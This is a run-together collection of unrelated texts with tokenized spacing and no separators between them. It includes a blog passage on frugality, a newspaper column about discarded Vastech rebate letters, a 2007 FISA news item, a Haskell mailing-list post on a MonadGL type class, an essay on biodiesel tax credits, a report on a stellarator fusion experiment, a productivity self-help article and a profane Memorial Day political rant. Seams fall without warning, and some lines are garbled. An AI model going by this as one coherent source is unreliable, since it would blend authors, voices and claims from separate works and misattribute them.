It ’s easy to look down upon someone for making choices outside of the norm , and it ’s something that many people fall into .
Most people have a deep internal need for acceptance , and by rejecting someone whose behaviors do n’t match what is normal to them , it ’s easy to feel accepted by a larger group .
Finally , most people do n’t see frugality as a path to being rich .
Being rich , to most people , means having a huge income , but as I ’ve mentioned before ,
there are two guaranteed ways to improve your financial situation , and one of them is directly through frugality .
I like to call this The Millionaire Next Door phenomenon – the average person thinks of a millionaire as being someone with a high income that spends a lot of money , when that ’s actually just a myth perpetuated by pop culture .
What do these statements add up to ?
A person who preaches frugality is going to receive some backlash , for better or worse .
As for me , I ’ve seen frugal living work incredible wonders in my personal financial life .
Thanks to frugal choices and a big slowdown on consumerism , I now have money in the bank , no high interest outstanding debts , and I have a lot of plans for the future that I actually have a clear path toward .
Frugality works , and I do n’t really mind the backlash – I ’ll keep talking about it .

I know that Shu Wong of San Jose has n’t received the $ 3.50 mail - in rebate for a Vastech computer networking USB hub purchased at a Fry ’s Electronics in May .
Richard Louie of Austin , Olivia Sattaypiwat of Saratoga and Buu Duong of San Jose have n’t received their rebates , either .
I know this because they told me so , and because I am staring at more than 1,300 rebate requests sent to Vastech on Bonaventura Drive in San Jose .
The envelopes were tossed – unopened – into a garbage dumpster near Vastech .
I have two boxes of envelopes that were thrown out without being processed .
In all of my years of reporting , I have never encountered such outrageous behavior against consumers .
An employee of nearby Dominion Enterprises found the letters , along with hundreds of others addressed to Vastech , at his company ’s dumpster .
He turned them over to his boss , Joel Schwartz , who gave them to me .
All of the letters were addressed to UR - 04 Rebate or some variation of the product name at the Vastech address .
Vastech is a small computer accessories company owned by Weizhen Tan , who goes by William .
I did n’t get a response when I sent e-mails as directed by Vastech ’s Web site .
And the company ’s voice mail was always full .
But he was there at the small office at 63 Bonaventura Drive in San Jose when I came calling , letters in hand .
` Bad employee ’
In his cramped office , Tan acknowledged that his 4 - year - old company was behind on processing rebates that it had offered to consumers from February to May .
He said he wanted to apologize to his customers .
When I asked why rebate letters were tossed out , he initially said it was due to a “ bad employee . ”
Later , he said that it was probably done by a friend of the family who was not a formal employee but was supposed to be helping out .
That person , he said , probably threw the letters out because of “ laziness . ”
He said the person no longer does any work for the company .
Tan acknowledged receiving a lot of complaints , some filtered through Fry ’s Electronics , which he said was the only chain that offered the Vastech products with rebates .
He promised to respond quickly to complaints lodged at the company ’s voice mail at ( 408 ) 786-7699 , or its e-mail address at support@vastechinc.com .
“ If we do rebates in the future , we will put in place a better system for tracking them , ” he said , promising that his company would be caught up on rebate processing this month .
“ It ’s unfortunate this happened .
We will take responsibility for them and handle it better . ”
At best , you can chalk this up to a small company getting stretched too thin when it offered a good rebate deal that consumers could n’t pass up .
But there is a bigger problem :
The whole rebate system .
“ They do n’t make it easy for you , ” said Vastech customer Richard Louie .
“ It ’s a lot of work .
When it ’s a small amount of money , I do n’t keep track of it .
For the bigger ones , I do keep track and sometimes I have to call them to complain . ”
This is why current rebate practices should end .
Fry ’s Electronics , which has 34 superstores in nine states , and other reputable chains like Best Buy and Circuit City , should have nothing to do with them .
From the start , the deck is stacked against consumers to discourage them from ever redeeming the rebates .
Depending on the rebate ’s value , anywhere from 5 percent to 80 percent of customers apply for them .
Rebates are often used to get consumers into stores by touting a low price like “ $ 39 after rebate . ”
Manufacturers use them to cut prices after a product is in the market and to get a better idea of who their customers are .
Manuel Valerio , a spokesman for Fry ’s in San Jose , confirmed that Fry ’s had received complaints about Vastech ’s rebates and that Fry ’s had assisted some customers in getting paid .
He said the store did n’t know rebate letters had been dumped , adding that Fry ’s would likely not sell products from companies that engaged in such practices .
But Fry ’s has no plans to ban rebates .
“ We certainly know there are many people who are no fans of rebates , and we are not the greatest fans of rebates as well , but the reality is they are out there , ” he said .
“ So long as manufacturers and other retailers offer them , Fry ’s will continue to do so because we do n’t want to be at a disadvantage vis-a - vis other competitors in the retail industry . ”
False advertising
The Federal Trade Commission has taken action for false advertising against a number of companies that have abused the rebate system , said Matthew Gold , a staff attorney for the FTC in San Francisco .
The companies must pay the consumers .
Retailers can be held liable if the manufacturers do n’t pay as promised .
In some cases , states have brought criminal fraud actions against companies .
The Better Business Bureau of Silicon Valley reports that it has processed 51 complaints about Vastech since February 2006 .
Of those , 49 went unanswered by the company in the past year .
The BBB considers that an unsatisfactory record .
“ We tried contacting Vastech a few times with no success , ” said BBB spokesman Zach Vander Meeden .
This is a ridiculous system that invites abuse .
All the discarded letters I looked at were postmarked around May and were found in the garbage just days after being sent .
It makes you wonder how often this happens .
I certainly do n’t trust Vastech at this point , even though Tan offered to sign rebate checks in front of me and requested the unprocessed rebate forms , which I plan to return to him .
And I think Fry ’s Electronics should take care of their customers if Vastech does n’t .
Imagine the surprise that Shu Wong got when I called and said he was n’t likely to get his rebate check .
“ It ’s only $ 3.50 , ” he said .
“ But that ’s wrong . ”
Concern grows over legislation that broadens spying power
Adam Doster
Published : Saturday August 18 , 2007

Intelligence legislation passed earlier this month is angering a growing number of critics who say an end - of - session scramble inadvertently gave the Bush Administration wider spying powers than previously thought .
According to Eric Lichtblau and James Risen of the New York Times , " by redefining the meaning of ' electronic surveillance , ' the new law narrows the types of communications covered in the Foreign Intelligence Surveillance Act , known as FISA , by indirectly giving the government the power to use intelligence collection methods far beyond wiretapping that previously required court approval if conducted inside the United States . "
The six - month amendment , which was rushed through both houses of Congress in early August , allowed for " the collection of business records , physical searches and so - called ' trap and trace ' operations , analyzing specific calling patterns . "
Some civil rights advocates suspect that the Administration made the bill 's language " intentionally vague " in order to increase its ability to spy on Americans .
Others think " the changes were the unintended consequences of the rushed legislative process just before this months Congressional recess . "
While a senior intelligence official who has been involved in the discussions on behalf of the administration argues the amendment is only a way " to speed access to the communications of foreign targets , not to sweep up the communications of Americans by claiming to focus on foreigners , " Democratic lawmakers might push for revision of the law as early as next month .

[ Haskell - cafe ] MonadGL - Partitioning effects without giving up type inference
The OpenGL bindings which come bundled with ghc are a really great example of how even an " almost - literal " port of a C API can still be easier to work with in haskell than it is in C , because of the benefits of type inference and powerful abstractions .
Even the ability to mapM_ is a tool to make C programmers envious , and there are useful combinators like preserving Matrix to guarantee pairing of pushes and pops .
Because the bindings are ported over using the FFI , all the GL calls are in the IO monad .
GL is build around state machines , so it 's not at all surprising to end up in some kind of state monad .
However , we find that the type system is not powerful enough to distinguish between myActionWhichOnlyMakesGLCalls :: IO ( ) and myActionWhichMixesGLAndIO :: IO ()
It would be much nicer if the type - system could distinguish the two .
One case in point is that an arbitrary IO action can modify IORefs , and it would be nice to have actions whose type guaranteed that they did n't do that .
It 's fairly simple to imagine something like the following : > {-# OPTIONS - fglasgow - exts #-} ( extensions are only for deriving ( Monad ) , it 's not important ) > > newtype GL a = GL { runGL :: IO a } deriving ( Monad ) > > unsafeIOToGL :: IO a -> GL a > unsafeIOToGL = GL
The intention here of course is that we export ' runGL ' which is safe , having type GL a -> IO a , but do n't export unsafeIOToGL .
Then we have lots of functions which are imported via the FFI and end up with IO types , here is a trival example : > _foo :: IO ( ) > _foo = putStrLn " OpenGL ! "
And we embed them into the GL monad .
No other module can corrupt our GL monad because we do n't export unsafeIOToGL . > foo :: GL ( ) > foo = unsafeIOToGL _foo
As far as it goes , this technique is absolutely fine .
We end up being able to write actions entirely in the GL monad : * Main > :t do { foo ; foo ; foo } do { foo ; foo ; foo } :: GL ( ) ... as well as actions which mix general IO and GL calls : * Main > :t do { runGL foo ; putStrLn
" Not a GL call " ; runGL foo } do { runGL foo ; putStrLn " Not a GL call " ; runGL foo } :: IO ()
The point of this message is actually to get rid of those annoying ' runGL ' calls .
When writing an IO action I want to be able to freely intermix IO and GL calls .
When writing a GL - only action , I want to only use GL calls .
And I want the type system to enforce that ; and ideally , infer it too .
So we define a type - class for " monad which can perform GL " : > class Monad m => MonadGL m where > runMonadGL :: m a -> IO a > embedGL :: GL a -> m a
And we write an instance for IO : > instance MonadGL IO where > runMonadGL = id > embedGL = runGL
Now we are able to bind our FFI call _foo slightly differently : > foo ' :: MonadGL m => m ( ) > foo ' = embedGL foo
This is interesting because , although we know that IO is in fact the only instance of MonadGL , there might in principle be others .
( For example , GL is itself an instance of MonadGL if you put runMonadGL = runGL and embedGL = id ) .
The type signature for foo ' guarantees that it will run in * any * MonadGL , and therefore can't use any IO - specific effects , only the GL ones .
Now we get the automatic type inference we want : * Main > :t do { foo ' ; foo ' ; foo ' } do { foo ' ; foo ' ; foo ' } :: ( MonadGL t ) => t ()
This only performs GL actions , no IO .
* Main > :t do { foo ' ; putStrLn " Normal " ; foo ' } do { foo ' ; putStrLn " Normal " ; foo ' } :: IO ()
The single IO call here forces the type to IO , but we are not required to put noisy ' runGL 's in front of every GL call .
This technique is quite scalable in that you can have any number of MonadFoos representing different librarys with different kinds of state , and ( as long as you do n't mind the modest blow - up in type signature size ) you get , for an arbitrary action , a type signature which pins down precisely what kinds of side - effect the action can have .
It would , however , be a real pain to run through all the ' foreign ' calls in the rather large GL library and add appropriate wrappers of the form ' embedGL . unsafeIOToGL '.
Definitely a job for an automated tool .
Incidentally , I do n't believe this technique has any performance implication at all .
The newtypes are all erased at compile time .
Any comments ?
I 'm sure this has been shown before but I do n't remember where .

I think most people would like to see us move away from fossil fuels .
But fossil fuels are money - makers for the oil companies , and the cheapest option ( strictly in terms of dollars at the pump ) for consumers .
So how do we wean off of fossil fuels ?
“ Of course not ! ” might be the immediate reaction of most people .
But does n’t it depend on the objectives you are trying to achieve or the behaviors you wish to influence ?
Are there no cases in which it would be warranted ?
What if the end result was a reduction in our fossil fuel consumption ?
Reducing Fossil Fuel Usage
There are really two options .
By far the most efficient would be to raise taxes on fossil fuels .
I am an American , but have lived in Europe before , and I am back here now .
In my opinion Europeans have been far wiser about their policies on fossil fuels than we have been in the U.S.
They made them expensive .
Does that mean everyone then lives in poverty because they can’t afford gasoline ?
Far from it .
People have adapted .
They are attracted to fuel efficient vehicles .
They live in smaller houses , closer to their jobs .
They embrace mass transit .
These are all behaviors that the U.S. has discouraged by keeping fossil fuel taxes low .
So , we are energy gluttons , and we maintain this gluttonous habit by ensuring that both major political parties think twice before raising our gas taxes .
Higher fossil fuel taxes would help level the playing field for alternative fuels .
Not only does this avoid the potential mistake of trying to forecast and subsidize particular technology winners , but it also discourages alternatives that have high fossil fuel inputs .
This is important , because we are now subsidizing some “ alternative ” options that are essentially 90 % recycled fossil fuel .
Taxing fossil fuels would strongly penalize those alternatives with high fossil fuel inputs .
However , I think it is unlikely that our political leaders have the will to tackle the tax option .
So then we are left with the alternative of subsidizing alternative energy and hoping that one or more sustainable options are developed as a result .
We have tried this experiment with corn ethanol for 30 years now .
It has been heavily subsidized since the late 1970 ’s , and today it is still not a viable option without mandates or subsidies .
( I know that there are those who truly believe that grain ethanol could survive without the subsidies .
I think what we would see is that the industry would collapse like a row of dominoes , which is why the subsidy remains in place ) .
Renewable Diesel
One option that I have always felt had serious potential as a sustainable option is renewable diesel .
Not only is the EROEI of the biodiesel production process superior to that of grain ethanol , but a diesel engine is also much more efficient than a spark - ignition engine ( which is where our ethanol supply ends up ) .
And like ethanol , we also subsidize renewable diesel .
And there are n't all that many objections to subsidizing biodiesel ; that is until an oil company wants to make it .
Biodiesel , which is strictly defined as alkyl esters made from the transesterification of vegetable oils or animal fats , receives a $ 1 / gallon production subsidy .
Biodiesel is produced by reacting the vegetable oil or animal fat with ( typically ) methanol ( which is usually produced from fossil fuels ) and a strong caustic .
The products are biodiesel and a glycerol by - product that can be difficult to dispose of ( it is often simply incinerated ) .
There is also a wastewater discharge , containing " free fatty acids that have a high biochemical oxygen demand , or BOD , that can remove oxygen from water bodies and harm aquatic life . "
None of the by - products , however , are classified as hazardous waste .
There are two other forms of renewable , or " green diesel " that are n't strictly defined as biodiesel .
One is obtained via a gasification and subsequent Fischer - Tropsch reaction of biomass .
Choren , for instance , uses this process to make their SunDiesel product .
The other form involves thermal processes in which animal fats or vegetable oils are heated and sometimes reacted with hydrogen to transform the oils into a diesel product .
Such processes for making diesel have been referred to as second - generation biofuel technology .
And these second - generation technologies have one big advantage over the first - generation technologies :
They can be blended up to 100 % with conventional diesel in any weather .
The cold weather limitations of alkyl ester biodiesel are well - known .
There was some uncertainty about whether new green diesel technologies met the definition of biodiesel and therefore qualified for the subsidy .
So Missouri Representative Roy Blunt , to help a company in his district - Changing World Technologies ( CWT ) - inserted a provision to make sure that so - called thermal depolymerization processes also received the subsidy .
In addition , he helped CWT secure a $ 5 million grant .
While this is money that in hindsight was probably thrown down a black hole because of grossly exaggerated claims on the part of CWT ( See my essay TDP : The Next Big Thing ) , it did set a precedent for expanding the biodiesel subsidy to include processes other than strict alkyl ester biodiesel .
In general , I would think that funding second - generation technologies is as important as funding first - generation technologies .
The First - Generation Recipients Scream Foul
On April 16th , 2007 ConocoPhillips and Tyson Foods announced a collaborative effort to produce green diesel via one of the second - generation technologies .
But the National Biodiesel Board , a lobby for the first - generation biodiesel producers , cried foul and issued an incredibly hypocritical news release , which I have dissected :
The Biodiesel Lobby Cries Foul
Their argument was that it was not fair to give an oil company - already making billions in profits - incentives for producing biofuels .
They also complained that the White House was directly lobbied on this matter .
This issue is discussed at :
ConocoPhillips , Tyson Lobbied White House on Tax Rule
The persistent theme of the article is that the credit was expanded on behalf of ConocoPhillips and Tyson Foods .
But it appears to me that a clarification was requested before millions of dollars had been invested in this process .
From the EPA 's Regulation of Fuels and Fuel Additives : Renewable Fuel Standard Requirements for 2006 , issued December 30 , 2005 we find the following definition of biodiesel :
Biodiesel means a diesel fuel substitute produced from nonpetroleum renewable resources that meets the registration requirements for fuels and fuel additives established by the Environmental Protection Agency under section 211 of the Clean Air Act .
It includes biodiesel derived from animal wastes ( including poultry fats and poultry wastes ) and other waste materials , or biodiesel derived from municipal solid waste and sludges and oils derived from wastewater and the treatment of wastewater .
That definition is certainly not process - specific , but I can understand the desire to get clarification on the rules before the project was announced .
The sticking point could be that someone could argue that " biodiesel " has traditionally been the term for the ester product .
But the key phrase to me looks like " diesel fuel substitute produced from nonpetroleum renewable resources . "
After all , what are we actually trying to achieve with these subsidies ?
Is n't the point to encourage movement away from fossil fuels and toward biofuels ?
Shall we start picking technology winners by funding one renewable " diesel fuel substitute " while denying funding to another ?
But some did n't see it that way at all .
What they saw was that an oil company was going to get the same subsidy that biodiesel producers received , and they are quite happy to cut off their nose to spite their face :
Democrats Target Tax Break for ConocoPhillips , Tyson
April 20 ( Bloomberg ) -- Democrats in Congress plan to reverse an Internal Revenue Service ruling that allowed ConocoPhillips and Tyson Foods Inc. to benefit from a tax break for producing alternative energy .
If adopted , the legislation would threaten a joint venture announced this week by ConocoPhillips and Tyson to produce diesel fuel from animal fat .
Lawmakers said that the tax credit was intended to benefit new technologies using animal carcasses and other food waste and that the companies pressured Bush administration officials to redefine it .
I almost hate to point out that this is new technology .
This particular process came along much later than both traditional biodiesel manufacture and the CWT process that did n't actually work as advertised yet still got $ 5 million .
As Jim Mulva pointed out , the project is not profitable without the tax credit and would not go forward otherwise :
ConocoPhillips spokesman Bill Graham said today that remarks by company Chief Executive Officer Jim Mulva earlier in the week sum up the company 's position on the tax cuts .
Mulva said that ConocoPhillips and Tyson would n't proceed with the venture if they did n't qualify for the tax credit , worth $ 1 per gallon of renewable diesel produced .
" It 's not profitable without the $ 1 tax credit , " Mulva said April 16 at a news conference in Houston .
" It 's very important and significant in going forward at this point in time . "
A Tyson spokesman also weighed in :
Gary Mickelson , a Tyson spokesman , said today that the company had n't seen any legislation .
" Denying the tax credit will only serve to limit the expansion and availability of alternative fuels and also damage the ability of livestock farmers and ranchers to participate in the renewable energy business , " Mickelson said in an e-mail , citing support for the IRS ruling by the National Cattlemen 's Beef Association , National Pork Producers Council , National Chicken Council and Texas Cattle Feeders Association .
The article also pointed out the it was n't only the biodiesel lobby that was unhappy :
It also angered the American Soybean Association , which fears refiners may begin shipping in less - expensive foreign palm oil to replace U.S. soy oil at the government 's expense .
This is a ridiculous argument , because nothing is stopping conventional biodiesel producers from doing that right now .
Of course this sort of protectionism is nothing new in the renewable energy field , as we do the same thing with corn ethanol .
We subsidize it , and then penalize much more sustainable Brazilian ethanol with a $ 0.54 / gallon tariff .
Except in this case , we are going to discourage the development of an alternative within the U.S. because it will benefit a U.S. oil company .
An article in the Houston Chronicle discussed the economics in a bit more detail :
Jeff Webster , general manager of Tyson 's Renewable Energy Division , noted that the cost of using animal fat as a feedstock is about $ 2 a gallon , or about $ 84 a barrel .
That compares with crude oil futures running above $ 63 a barrel on the New York Mercantile Exchange .
The $ 1 - per - gallon tax credit , however , would bring the feedstock cost for animal fat down to about $ 1 a gallon , or $ 42 a barrel .
" In general , the feedstock cost is the big driver of your overall costs , as much as 75 percent of your cost structure , " Webster said .
Asked about the effort to change the interpretation , ConocoPhillips spokesman Bill Graham noted : " With any repeal , you 're changing the economics for the manufacturing of the renewable diesel .
" If it is repealed and maintained for other forms of alternative energy , then what you 're doing is picking and choosing between alternative energies .
And we do n't think that 's sound public policy . "
Objections
Most objections that I have seen are generally along the lines of " Why on earth would I want my tax dollars going to a company making billions of dollars a year ?
They do n't need any subsidies . "
Of course that is correct .
They do n't need subsidies to continue business as usual .
In fact , all that would happen if you removed the so - called indirect subsidies is that we would pay more for gasoline .
There would be some demand destruction as a result , so perhaps there would be some impact to the oil companies , but for the most part it would be business as usual .
And there 's the rub .
If you want to take that position : " They do n't need my tax money " , then do n't expect them to do things that you think they should do .
As someone else wrote to me " It is in their best interest to move into biofuels . "
But you see , as far as they are concerned it is not .
What is being asked here is for them to enter into a guaranteed money - losing commercial venture .
That is a lot different than just funding R&D research , which is being done regardless .
You saw the API conference call transcript .
The oil industry , rightly or wrongly , believes that their business will be oil for quite some time .
So that leaves two possibilities .
First , what if they are wrong ?
Well , if they are wrong and they are discouraged from moving into next - generation fuels , then you and I will suffer .
It will be peak with no parachute .
We will have wasted quite an opportunity to nudge them in the direction of diversifying the fuel supply .
So , what if they are right and there is plenty of oil and gas ?
Well , they will continue to make oil and gas , consumers will continue to buy it , oil companies will continue to profit , and greenhouse gas emissions will continue to rise .
And they will not change their behavior because the status quo is making money , and the shareholders are happy .
So the way I see it , we need to encourage a move away from fossil fuels even if we have to give oil companies the same incentives that we give everyone else .
Who will be hurt if we do n't is you and me .
Conclusions
This case is very frustrating to me .
It highlights the problems that we are going to have in encouraging oil companies to move toward alternative energy .
What is the purpose of these subsidies ?
Is n't it to make the alternatives competitive with fossil fuels ?
So then why should we expect oil companies to expand R&D on alternative fuels if they are going to sell these fuels at a loss ?
Remember , the current biodiesel producers are n't losing their $ 1 / gallon tax credit .
Farmer Marty Ross , mentioned in The Biodiesel Lobby Cries Foul , is still going to receive his $ 5.5 million a year in subsidies .
Furthermore , he qualifies for various grants and low - interest loans to give him an additional benefit .
But biodiesel producers want both a subsidy and a monopoly , and their position endangers us all by discouraging the development of next - generation alternatives .
Oil companies are still answerable to their shareholders .
They can't be expected to invest big dollars into product development if they believe they are going to sell the product at a loss .
These credits should be open to anyone willing to make the necessary investments .
Would you rather see the money flow to the Middle East ?
Do you want the next generation of fuels to be coal - based , or derived from shale oil ?
Because this is what will happen if we make it more difficult for oil companies to become involved in alternative fuels .
Ask yourself the following questions :
1 . Will technologies like this reduce our dependence on foreign oil ?
Yes .
2 . Will this encourage a renewable diesel technology that does not commercially exist ?
Yes
3 . Will this help diversify our fuel supply ?
Yes .
4 . Does this produce a fuel with superior performance characteristics ?
Yes
That would seem like a slam - dunk .
Yet there is one more question to answer , and because of that answer some are willing to forego quite an opportunity to nudge oil companies in a sustainable direction :
5 . Will an oil company benefit , just as any other company could benefit ?
Yes .
I have personally lobbied my company to become more involved in alternative energy , and this attempt to rescind the credit is very upsetting to me .
I have skin in the game here , and I want to encourage my company to move into alternative fuels .
But rescinding the credit will be a disincentive because I know what the economics look like for these biofuels .
Disclaimer
Of course I do work for " an " oil company .
I can't say which one , although it is relatively easy to figure out with Google .
I tell you this because I do n't want there to be any misunderstandings .
However , I can't come right out and name my company , because I am not sanctioned to speak for them .
Their position and my position do n't always mesh , so it is important to keep my personal opinions separate from official company statements .
I was conflicted about whether to write this essay , because I do n't want it to look like I am putting my self - interests ahead of good energy policy .
And I would n't even touch this one , but I think this is a very important , precedent - setting issue that has major implications on the direction of our energy policy .
I asked and received feedback from TOD editors and contributors , and the feedback that I did receive suggested that I should go ahead and post it .
A project by University of Wisconsin - Madison researchers has come one step closer to making fusion energy possible .
The research team , headed by electrical and computer engineering Professor David Anderson and research assistant John Canik , recently proved that the Helically Symmetric eXperiment ( HSX ) , an odd - looking magnetic plasma chamber called a stellarator , can overcome a major barrier in plasma research , in which stellarators lose too much energy to reach the high temperatures needed for fusion .
Helically Symmetric Experiment
Published in a recent issue of Physical Review Letters , the new results show that the unique design of the HSX in fact loses less energy , meaning that fusion in this type of stellarator could be possible .
Plasma is very hot , ionized gas that can conduct electricity - essentially , it 's what stars are made of .
If heated to the point of ignition , hydrogen ions could fuse into helium , the same reaction that powers the sun .
This fusion could be a clean , sustainable and limitless energy source .
Current plasma research builds on two types of magnetic plasma confinement devices , tokamaks and stellarators .
The HSX aims to merge the best properties of both by giving a more stable stellarator the confinement of a more energetically efficient tokamak .
" The slower energy comes out , the less power you have to put in , and the more economical the reactor is , " says Canik .
Tokamaks , the current leader in the fusion race , are powered by plasma currents , which provide part of the magnetic field that confines the plasma .
However , they are prone to " disruptions . "
" The problem is you need very large plasma currents and it's not clear whether we 'll be able to drive that large of a current in a reactor - sized machine , or control it .
It may blow itself apart , " says Canik .
Stellarators do not have currents , and therefore no disruptions , but they tend to lose energy at a high rate , known as transport .
The external magnetic coils used to generate the plasma - confining field are partially responsible for the high transport rates in conventional stellarators .
The coils add some ripple to the magnetic field , and the plasma can get trapped in the ripple and lost .
The HSX is the first stellarator to use a quasi-symmetric magnetic field .
The reactor itself looks futuristic : Twisted magnetic coils wrap around the warped doughnut - shaped chamber , with instruments and sensors protruding at odd angles .
But the semi-helical coils that give the HSX its unique shape also direct the strength of the magnetic field , confining the plasma in a way that helps it retain energy .
The team designed and built the HSX with the prediction that quasisymmetry would reduce transport .
As the team 's latest research shows , that 's exactly what it does .
" This is the first demonstration that quasisymmetry works , and you can actually measure the reduction in transport that you get , " says Canik .
These results excited and relieved the researchers who have spent years working on the project .
" We all thought the machine would do what it 's turning out to do , but there are a million reasons why it might not : the theory might be wrong , ( or ) we might have built it badly , " says Anderson .
" But everything is panning out and supporting the fact that the ideas on which it was based were correct , and really points the way of the future for the stellarator . "
The next step for the project is to establish how much symmetry in the coils is necessary to achieve low transport rates .
They hope to make the coils easier to engineer , with the mindset that the principles used in the HSX could someday be incorporated into fusion generators , the reason that Anderson and his team began designing the HSX 17 years ago .
" It 's an exciting field .
It 's something where one can contribute positively to mankind with an energy source that 's completely sustainable , does n't involve nuclear proliferation or radioactive waste , with a limitless fuel supply , " says Anderson .
" Plus , the machines look cool . "

Where is your “ sweet spot ” ?
What are the circumstances that lead up to you being “ in the groove ” ?
Can you answer the who , what , why , when , and where questions about the times in your life when you are truly on track , happy , and headed for success ?
Here ’s the truth : A lot of people spend a lot of time in an environment or a state of mind that is far from conducive to their own success , then they sit around wondering why they are n’t successful !
Our lives are constantly throwing different types of circumstances at us that may or may not be to our liking , yet rather than changing the circumstances so that we are in a comfortable resonance , we simply put our head down , try to plow through undesirable situations , and then wonder why our results are less than stellar .
If you want to be successful in life , you need to stay in a state of mind that creates an emotional resonance with what you are doing .
There is a common misconception that simply working harder will allow you to achieve more results .
However , even though a more concerted effort will net more results , you are still swimming against the current unless you can find a way to do your work in a manner that pleases you .
You will accomplish far more in an hour of hard work when you are “ in the groove ” than that same hour of hard work whenever you are unable enjoy your work or to stay focused on your tasks .
Ask yourself the who , what , why , when , and where questions about your environment , and make any changes necessary so that the answers to those questions will create an environment that allows you to work easily and effortlessly .
WHO : Who are you doing the work for ?
If you are working for an employer , the obvious answer would be that you are doing the work for them .
However , that is totally false .
You chose to work there , and you continue to choose to remain there day after day .
You keep that job because it brings you something that you want , not something that your employer wants .
By realizing that your job is something that you have for yourself , one of two things will happen :
You will start to enjoy your work more because you realize that you go to that job every day because you choose to , or
, or You will realize that you are unable to enjoy the fact that you are working for someone else , and you will find a way to make your own money .
WHAT : What are you doing ?
Did you ever stop to think about that ?
Oh sure , there are plenty of tasks in front of you that need to be accomplished , but do you ever stop to think about what it is that you are actually working towards ?
Do you even care about the big picture that is related to whatever it is that you are working towards ?
For that matter , do you even know what you are working towards , or are you just mindlessly doing the work without really thinking about what it is that you are trying to accomplish in the long - term ?
If you are aware of and actually care about the results of your efforts , then you will resonate with the work that is required to attain those results .
Whether the outcome in question is weight loss , child rearing , or corporate minutia , knowing what you are working towards gives you the opportunity to decide if you care enough about it to actually enjoy the work .
WHY : Once you know what it is that you are doing , now it is time to ask yourself why you are doing it to begin with .
This is the tricky part that trips a lot of people up .
Your “ why ” reasons are almost never what you think they are at first .
Most “ why ” reasons go much deeper than the surface answers that come to mind when people ask themselves why they are doing any particular thing .
People who want to lose weight tend to cite reasons such as looking good in a bikini , being healthy , having more energy , etc .
However , by digging deeper , reasons such as low self - esteem , lack of confidence , bad past experiences , etc. , are usually the real “ why ” reasons .
Most people who are looking for financial success will cite reasons such wanting a nice house , a secure future for their family , a sense of accomplishment , etc .
However , when it comes down to it , a lot of people are actually battling self - limiting beliefs about money , they are looking for the freedom that money can buy , they want to prove to themselves or others that they can do it , etc .
Trying to get a nice house , a nice car , or a large college fund for your children is not nearly as motivational as knowing why you truly want those things .
WHEN : This is Goal Setting 101 : When do you want to accomplish your goal by ?
Even if you work for someone else , you need to have a target date for whenever you want to accomplish some very specific goal .
Maybe it is to reach a certain level in the company , maybe it is a certain sales goal , or maybe it is a salary level that you are after .
Either way , if you leave the target date open to “ some point in the future , ” there will never be the sense of urgency that is needed in order to push yourself hard to accomplish your goal by that certain date .
If you own your own business or have some other self - employed status , when do you want to attain a certain level of security ?
When will your business be solid enough to allow you more time for yourself ?
When will you be able to start delegating work to others ?
Again , the idea here is not to set up some mindless productivity calendar , but rather to motivate yourself to succeed by knowing when it is that you want to accomplish your goal .
By working towards a goal that you have personally set for yourself , you will enjoy the work because you are doing it for you , not for someone else .
WHERE : Your work environment can play a huge role in the emotional state that you have whenever you are working on your tasks .
If you do not enjoy being in your work environment , it will be very difficult for you to remain mentally sharp , to enjoy your work , and to keep up a high level of productivity .
If you work for someone else , then do everything that you are allowed to do in order to make your environment an enjoyable place for you to spend a lot of your time .
This could include any or all of the following : decorate your environment , put up motivational reminders where you will see them frequently , make the environment physically comfortable with proper furnishings and accessories , play music that helps you to focus on your work .
If you work for yourself at home or in an office , then use the freedom that self - employment brings and pull out all the stops in order to make your work environment exactly what you want to be .
Also , if you work at home , be sure to keep your work environment separate from the rest of the house .
That is your space – keep it free from the negative or stressful vibrations that sometimes permeate other areas of the house .
Also , if you work on a laptop computer , do n’t be afraid to simply leave any environment that does not resonate with you .
If you are more comfortable working in a local coffee shop , at the library , or outside on your deck , then go there !
Do n’t feel that in order to run a professional business that you must work in an office .
Your professionalism will come from you working in your natural state of flow , not from sitting in an office that makes you uncomfortable .
The Bottom Line
The bottom line to maximizing your productivity is that you need to remain in an environment and a state of mind that you actually enjoy being in – your own personal circle of Light .
Ask yourself the who , what , why , when , and where questions about your working circumstances , and find answers that resonate with you .
If you fail to do so , you ’ll just keep swimming upstream , fighting the current rather than letting it carry you easily along .
So it 's Memorial Day , when we honor American veterans .
And that is a Good Thing .
But I still think the constant refrain of commonly expressed sentiments such as these , from the President , are unsound .
" Those who have died in the Civil War , World War I , World War II and the Korean and Vietnam conflicts fought for freedoms , which come at great cost and will survive only as long as there are Americans willing to defend the nation against determined enemies , he said . "
This is doxa , not truth .
And it is dangerous doxa at that , since the incessant assertion that the American military is by its nature always involved in the business of protecting American " freedoms " against external threats exerts what Bourdieu calls a " censorship " effect .
It discourages any sort of rational discussion of the role the military plays now , and ought to play in the future , in American society and abroad .
To state that the US military is not necessarily or even remotely the primary , best , or even appropriate mechanism of guaranteeing American liberties , much less spreading them around the globe , is to utter a kind of secular blasphemy , despite the fact that such statements as the one above from Bush are , quite obviously , at best extremely reductive and at worst mendacious bullshit .
This is because of the thoroughly mystified concept of " freedom " or " freedoms " inherent in orthodox patriotic discourse .
Um ... and shit .
The point is that nobody ever gets specific about exactly what " freedoms " are at stake when it comes to the role of the American military viz Teh Enemy .
This is because nobody " official " really wants to talk about the actual reasons the military gets sent halfway around the fucking world to blow shit up and get shot at .
It 's much easier , even compulsory , to simply talk the pretty talk .
Fuck that shit .
I mean , let 's look at the words and then at the facts : " Those who have died in the Civil War , World War I , World War II and the Korean and Vietnam conflicts fought for freedoms , which come at great cost . "
What , no mention of the Merkin Revolution ?
Pity , since apart from perhaps WWII that 's the only one out of this list where the doxa might have anything to do with reality .
And even there , if we are going to define " freedom " as the right of the individual to make certain choices as opposed to others in terms of how they will live their lives ( I 'm even granting here a 21st - century internetty libertarian notion of agency , which I ordinarily sneer at as an absurd fairytale -- see , I can play nice ! ) , unless we concede that modern Britons live under the Tony Blair - ian jackboot ... well , it 's a bit of a wash .
Britain had already developed strong notions of individual rights ; indeed , that 's why the Revolution was possible in the first place .
So if the Colonies had never gone hat in hand to France , why , even today you 'd probably still have the legal right to bulk - email penis enlargement spam to a multitude of strangers .
Because as soon as we begin to consider the case of specific as opposed to rhetorical " freedoms , " it is clear that no external " enemy " has ever posed nearly as much of a threat to them as have home - grown political and cultural interests .
Let 's take " freedom of speech , " and run down Bush 's list : did American troops in these wars really fight and maybe die to preserve the right of US citizens to freedom of speech ?
Civil War : Granting that Northern troops really fought to end slavery , well , it did do the slaves some good in this area .
Slaves did not have freedom of speech .
But it is only sporting to note that the Confederate troops also very much fought to " preserve freedoms , " as they saw them .
